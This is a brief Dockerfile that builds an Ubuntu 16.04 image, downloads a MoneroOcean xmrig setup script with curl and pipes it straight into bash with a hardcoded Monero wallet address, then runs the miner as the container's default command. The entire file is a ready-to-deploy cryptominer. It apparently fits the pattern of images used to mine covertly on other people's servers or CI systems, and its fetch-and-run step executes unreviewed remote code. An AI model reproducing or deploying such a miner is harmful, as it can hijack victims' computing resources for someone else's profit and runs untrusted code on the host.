FROM ubuntu:16.04
RUN apt update
RUN apt -y install curl
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '43k8MLURBQfGUrEtHAvkjNFfvhJTPjqhU8sfSPmKrnLoU4j7vQQhQpm1nji9RUx8A4Kw98YNiwN85hcydEerPUQVMM6WntN'
CMD /root/moneroocean/miner.sh

